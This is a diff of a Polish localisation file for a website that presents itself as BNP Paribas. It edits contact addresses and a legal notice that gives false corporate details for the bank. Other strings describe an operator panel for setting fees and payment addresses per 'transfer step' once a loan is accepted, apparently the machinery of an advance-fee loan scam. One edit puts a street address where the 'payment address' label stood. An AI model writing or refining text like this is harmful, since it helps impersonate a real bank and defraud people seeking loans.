@@ -282,8 +282,8 @@
     "defaultEmailPlaceholder": "ty@przyklad.com",
     "back": "Wstecz",
     "phoneTitle": "Obsługa klienta",
-    "address": "103 avenue des Champs-Élysées",
-    "addressCity": "75008 Paryż, Francja",
+    "address": "16 boulevard des Italiens",
+    "addressCity": "75009 Paryż, Francja",
     "sending": "Wysyłanie…",
     "successQueued": "Twoja wiadomość została zarejestrowana. Nasz zespół odpowie wkrótce."
   },
@@ -442,7 +442,7 @@
     "sectionHelp": "Ustaw opłaty i adres płatności dla każdego kroku, zweryfikuj paragon, a następnie wyślij kod.",
     "gatedTitle": "Konfiguracja zablokowana",
     "gatedDesc": "Konfiguracja kroku transferu staje się dostępna po akceptacji pożyczki.",
-    "address": "Adres płatności",
+    "address": "16 boulevard des Italiens",
     "saved": "Konfiguracja zapisana",
     "invalidFee": "Nieprawidłowa opłata",
     "codeSent": "Kod wygenerowany i wysłany",
@@ -1057,7 +1057,7 @@
       "sections": [
         {
           "h": "Wydawca",
-          "p": "BNP PARIBAS — SAS z kapitałem 1 000 000 EUR — siedziba: 1 Centenary Square, Birmingham, Wielka Brytania."
+          "p": "BNP PARIBAS — SAS z kapitałem 1 000 000 EUR — siedziba: 16 boulevard des Italiens, 75009 Paris, France"
         },
         {
           "h": "Odpowiedzialny",
